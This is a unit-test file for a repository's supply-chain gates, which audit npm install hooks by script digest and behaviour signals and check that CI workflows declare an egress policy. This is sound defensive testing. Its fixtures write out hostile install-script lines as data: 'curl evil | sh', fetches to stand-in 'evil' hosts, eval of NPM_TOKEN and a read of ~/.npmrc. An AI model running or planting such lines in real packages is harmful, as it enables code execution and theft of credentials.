/**
 * W6.3 unit tests (umbrella #842) — the dependency-behaviour and CI-egress
 * ratchets.
 *
 * Both gates are ledger-backed, and a ledger-backed gate has one classic
 * failure mode: it goes green because the ledger absorbed the finding. So every
 * drift direction gets its own sabotage case here, including the two that make
 * a ledger a ratchet rather than an allowlist — a stale entry must FAIL, and a
 * bare entry with no written reason must FAIL.
 *
 * The last two tests run the real gates against the real repo, so a change to
 * bun.lock or to .github/workflows/ that the ledgers do not cover is caught by
 * this file and not only by CI.
 */
import assert from "node:assert/strict";
import { readdirSync, readFileSync } from "node:fs";
import path from "node:path";
import test from "node:test";

import {
  auditLifecycle,
  collectInstallHooks,
  fingerprintHooks,
  INSTALL_HOOKS,
  ledgerFor,
  referencedScripts,
} from "./lifecycle-audit.mjs";
import {
  auditEgress,
  executesDependencyCode,
  hardenRunnerSteps,
} from "./lint-ci-egress.mjs";

const here = import.meta.dirname;
const root = path.resolve(here, "../..");

/** An in-memory package as `collectInstallHooks` would report it. */
function entry(name, commands, dir = "/nowhere") {
  return { name, version: "1.0.0", dir, commands };
}

/** `fingerprintHooks` with the filesystem replaced by a table. */
function fingerprintWith(target, files) {
  return fingerprintHooks(target, (file) => files[file] ?? null);
}

test("INSTALL_HOOKS covers the hooks a package manager runs, and not `prepare`", () => {
  // `prepare` is not run for registry dependencies, so including it would bury
  // three real findings under ~95 irrelevant ones.
  assert.deepEqual(INSTALL_HOOKS, ["preinstall", "install", "postinstall"]);
});

test("referencedScripts finds the local files a hook command invokes", () => {
  assert.deepEqual(referencedScripts("node install.js"), ["install.js"]);
  assert.deepEqual(referencedScripts("node ./script/select-7z-arch.js"), [
    "script/select-7z-arch.js",
  ]);
  assert.deepEqual(referencedScripts("sh ./bin/setup.sh && node post.mjs"), [
    "bin/setup.sh",
    "post.mjs",
  ]);
  assert.deepEqual(referencedScripts("echo hello"), []);
});

test("fingerprintHooks digests the script BYTES, not only the command string", () => {
  // This is the behaviour layer's whole claim: a republished tarball can keep
  // `postinstall: node install.js` and change what install.js does.
  const target = {
    ...entry("p", { postinstall: "node install.js" }),
    dir: "/pkg",
  };
  const before = fingerprintWith(target, {
    "/pkg/install.js": "console.log('hi')",
  });
  const after = fingerprintWith(target, {
    "/pkg/install.js": "require('https').get('http://evil')",
  });
  assert.notEqual(before.digest, after.digest);
  assert.deepEqual(before.files, ["install.js"]);
});

test("fingerprintHooks raises behaviour signals for network, spawn, eval and secret reads", () => {
  const target = {
    ...entry("p", { postinstall: "node install.js" }),
    dir: "/pkg",
  };
  const { signals } = fingerprintWith(target, {
    "/pkg/install.js": [
      "const https = require('https');",
      "https.get('https://cdn.example.invalid/bin');",
      "require('child_process').execSync('curl -s https://evil.invalid');",
      "eval(process.env.NPM_TOKEN);",
      "require('fs').readFileSync(require('os').homedir() + '/.npmrc');",
    ].join("\n"),
  });
  for (const expected of [
    "network-fetch",
    "network-tool",
    "process-spawn",
    "dynamic-eval",
    "home-dir-read",
  ])
    assert.ok(
      signals.includes(expected),
      `missing signal ${expected} in ${signals.join(", ")}`
    );
});

test("fingerprintHooks reports no signals for an inert copy-a-file installer", () => {
  const target = { ...entry("p", { install: "node copy.js" }), dir: "/pkg" };
  const { signals } = fingerprintWith(target, {
    "/pkg/copy.js": "require('fs').copyFileSync('vendor/a', 'vendor/b');",
  });
  assert.deepEqual(signals, []);
});

const CLEAN_LEDGER = {
  packages: {
    known: {
      version: "1.0.0",
      hooks: ["postinstall"],
      digest: "d1",
      signals: [],
      executes: false,
      reason: "reviewed",
    },
  },
};
const CLEAN_OBSERVED = [
  {
    ...entry("known", { postinstall: "node x.js" }),
    digest: "d1",
    signals: [],
  },
];

test("auditLifecycle passes when the ledger describes the tree exactly", () => {
  const result = auditLifecycle({
    observed: CLEAN_OBSERVED,
    ledger: CLEAN_LEDGER,
    trustedDependencies: [],
  });
  assert.deepEqual(result.problems, []);
  assert.equal(result.ok, true);
});

test("REFUSAL: a new dependency with install-time code is unreviewed code", () => {
  const result = auditLifecycle({
    observed: [
      ...CLEAN_OBSERVED,
      {
        ...entry("newcomer", { postinstall: "curl evil | sh" }),
        digest: "d2",
        signals: ["network-tool"],
      },
    ],
    ledger: CLEAN_LEDGER,
    trustedDependencies: [],
  });
  assert.equal(result.ok, false);
  assert.match(
    result.problems.join(" "),
    /unledgered install-time code: newcomer/u
  );
});

test("REFUSAL: same version, different install script — the republish attack", () => {
  const result = auditLifecycle({
    observed: [{ ...CLEAN_OBSERVED[0], digest: "d-changed" }],
    ledger: CLEAN_LEDGER,
    trustedDependencies: [],
  });
  assert.equal(result.ok, false);
  assert.match(result.problems.join(" "), /install-script digest changed/u);
});

test("REFUSAL: a version bump forces a re-review rather than inheriting the pin", () => {
  const result = auditLifecycle({
    observed: [{ ...CLEAN_OBSERVED[0], version: "1.0.1" }],
    ledger: CLEAN_LEDGER,
    trustedDependencies: [],
  });
  assert.match(
    result.problems.join(" "),
    /ledger pins 1\.0\.0, tree has 1\.0\.1/u
  );
});

test("REFUSAL: a newly-raised behaviour signal on an already-ledgered package", () => {
  const result = auditLifecycle({
    observed: [{ ...CLEAN_OBSERVED[0], signals: ["network-fetch"] }],
    ledger: CLEAN_LEDGER,
    trustedDependencies: [],
  });
  assert.match(
    result.problems.join(" "),
    /new behaviour signal\(s\) network-fetch/u
  );
});

test("REFUSAL: a stale ledger entry — the ratchet must only shrink", () => {
  const result = auditLifecycle({
    observed: [],
    ledger: CLEAN_LEDGER,
    trustedDependencies: [],
  });
  assert.equal(result.ok, false);
  assert.match(result.problems.join(" "), /stale ledger entry: known/u);
});

test("REFUSAL: a ledger entry with no written reason is not a review", () => {
  const result = auditLifecycle({
    observed: CLEAN_OBSERVED,
    ledger: {
      packages: { known: { ...CLEAN_LEDGER.packages.known, reason: "  " } },
    },
    trustedDependencies: [],
  });
  assert.match(result.problems.join(" "), /has no reason/u);
});

test("REFUSAL: trustedDependencies is what actually EXECUTES, so it must be ledgered", () => {
  const unreviewed = auditLifecycle({
    observed: CLEAN_OBSERVED,
    ledger: CLEAN_LEDGER,
    trustedDependencies: ["sneaky"],
  });
  assert.match(unreviewed.problems.join(" "), /would EXECUTE unreviewed/u);

  const unmarked = auditLifecycle({
    observed: CLEAN_OBSERVED,
    ledger: CLEAN_LEDGER,
    trustedDependencies: ["known"],
  });
  assert.match(unmarked.problems.join(" "), /not marked "executes": true/u);

  const overstated = auditLifecycle({
    observed: CLEAN_OBSERVED,
    ledger: {
      packages: { known: { ...CLEAN_LEDGER.packages.known, executes: true } },
    },
    trustedDependencies: [],
  });
  assert.match(
    overstated.problems.join(" "),
    /the ledger overstates what runs/u
  );
});

test("REFUSAL: `--print-ledger` output does not self-approve", () => {
  // The generator writes the SHAPE; the review is a sentence a human writes.
  // Pasting the generated block straight in must stay red, or the ratchet is a
  // one-command rubber stamp.
  const observed = [
    {
      ...entry("fresh", { postinstall: "node x.js" }),
      digest: "d",
      signals: [],
    },
  ];
  const generated = ledgerFor(observed);
  // The marker below is the assertion's SUBJECT — the generator's unreviewed
  // placeholder — not a promise this file makes. A tracker ref would imply the
  // placeholder is tracked work, so the per-line waiver is the honest form.
  assert.match(generated.fresh.reason, /TODO/u); // governance: allow-no-orphan-todos asserts on the generator's placeholder text
  const result = auditLifecycle({
    observed,
    ledger: { packages: generated },
    trustedDependencies: [],
  });
  assert.equal(result.ok, false);
  assert.match(
    result.problems.join(" "),
    /still carries the generated TODO reason/u // governance: allow-no-orphan-todos matches the audit's own refusal message, not a deferred task
  );
});

test("executesDependencyCode distinguishes lanes that run third-party code", () => {
  assert.equal(
    executesDependencyCode("steps:\n  - uses: ./.github/actions/setup\n"),
    true
  );
  assert.equal(
    executesDependencyCode("steps:\n  - run: bun install --frozen-lockfile\n"),
    true
  );
  assert.equal(executesDependencyCode("steps:\n  - run: npm ci\n"), true);
  assert.equal(
    executesDependencyCode(
      "jobs:\n  a:\n    uses: ./.github/workflows/lane.yml\n"
    ),
    false
  );
  assert.equal(
    executesDependencyCode("steps:\n  - run: bash .governance/run.sh\n"),
    false
  );
});

test("hardenRunnerSteps reads the policy off the step that declares it", () => {
  const source = [
    "    steps:",
    "      - uses: step-security/harden-runner@0000000000000000000000000000000000000000 # v2",
    "        with:",
    "          egress-policy: block",
    "      - uses: ./.github/actions/setup",
  ].join("\n");
  assert.deepEqual(hardenRunnerSteps(source), [
    {
      ref: "step-security/harden-runner@0000000000000000000000000000000000000000",
      policy: "block",
    },
  ]);
  const noPolicy = hardenRunnerSteps(
    "      - uses: step-security/harden-runner@0000000000000000000000000000000000000000\n      - run: x\n"
  );
  assert.deepEqual(noPolicy, [
    {
      ref: "step-security/harden-runner@0000000000000000000000000000000000000000",
      policy: null,
    },
  ]);
});

const HARDENED = [
  "    steps:",
  "      - uses: step-security/harden-runner@0000000000000000000000000000000000000000 # v2",
  "        with:",
  "          egress-policy: block",
  "      - uses: ./.github/actions/setup",
].join("\n");
const UNHARDENED = "    steps:\n      - uses: ./.github/actions/setup\n";

test("auditEgress passes a hardened workflow and a ledgered one", () => {
  const result = auditEgress({
    workflows: [
      { file: "a.yml", source: HARDENED },
      { file: "b.yml", source: UNHARDENED },
    ],
    ledger: { "b.yml": { reason: "priority 3, allowlist not learned yet" } },
  });
  assert.deepEqual(result.problems, []);
  assert.deepEqual(result.hardened, ["a.yml"]);
  assert.deepEqual(result.ledgered, ["b.yml"]);
});

test("REFUSAL: a new workflow that installs dependencies without an egress policy", () => {
  const result = auditEgress({
    workflows: [{ file: "new.yml", source: UNHARDENED }],
    ledger: {},
  });
  assert.equal(result.ok, false);
  assert.match(
    result.problems.join(" "),
    /new\.yml installs and runs dependency code/u
  );
});

test("REFUSAL: a hardened workflow left in the ledger — the ratchet must only shrink", () => {
  const result = auditEgress({
    workflows: [{ file: "a.yml", source: HARDENED }],
    ledger: { "a.yml": { reason: "obsolete" } },
  });
  assert.match(
    result.problems.join(" "),
    /stale ledger entry: a\.yml now runs harden-runner/u
  );
});

test("REFUSAL: a ledger entry for a workflow that no longer exists", () => {
  const result = auditEgress({
    workflows: [],
    ledger: { "deleted.yml": { reason: "x" } },
  });
  assert.match(
    result.problems.join(" "),
    /deleted\.yml is not a workflow in this repo/u
  );
});

test("REFUSAL: harden-runner with no policy, or an unknown one, is not enforcement", () => {
  const noPolicy = auditEgress({
    workflows: [
      {
        file: "a.yml",
        source:
          "      - uses: step-security/harden-runner@0000000000000000000000000000000000000000\n",
      },
    ],
    ledger: {},
  });
  assert.match(noPolicy.problems.join(" "), /declares no egress-policy/u);
  const bogus = auditEgress({
    workflows: [
      { file: "a.yml", source: HARDENED.replace("block", "whatever") },
    ],
    ledger: {},
  });
  assert.match(bogus.problems.join(" "), /unknown egress-policy "whatever"/u);
});

test("REFUSAL: a bare ledger exemption with no reason", () => {
  const result = auditEgress({
    workflows: [{ file: "b.yml", source: UNHARDENED }],
    ledger: { "b.yml": {} },
  });
  assert.match(result.problems.join(" "), /has no reason/u);
});

test("the shipped lifecycle ledger describes this repo's real node_modules", () => {
  const observed = collectInstallHooks(path.join(root, "node_modules")).map(
    (found) => ({
      ...found,
      ...fingerprintHooks(found),
    })
  );
  const ledger = JSON.parse(
    readFileSync(path.join(here, "lifecycle-ledger.json"), "utf8")
  );
  const manifest = JSON.parse(
    readFileSync(path.join(root, "package.json"), "utf8")
  );
  const result = auditLifecycle({
    observed,
    ledger,
    trustedDependencies: manifest.trustedDependencies ?? [],
  });
  assert.deepEqual(result.problems, []);
  assert.ok(
    observed.length > 0,
    "no install hooks found at all — the collector or the tree changed shape"
  );
  // The load-bearing claim: nothing here is trusted to execute at install time.
  assert.deepEqual(manifest.trustedDependencies ?? [], []);
});

test("the shipped egress ledger describes this repo's real workflows", () => {
  const dir = path.join(root, ".github/workflows");
  const files = readdirSync(dir).filter((file) => file.endsWith(".yml"));
  const result = auditEgress({
    workflows: files.map((file) => ({
      file,
      source: readFileSync(path.join(dir, file), "utf8"),
    })),
    ledger: JSON.parse(
      readFileSync(path.join(here, "egress-ledger.json"), "utf8")
    ).workflows,
  });
  assert.deepEqual(result.problems, []);
});
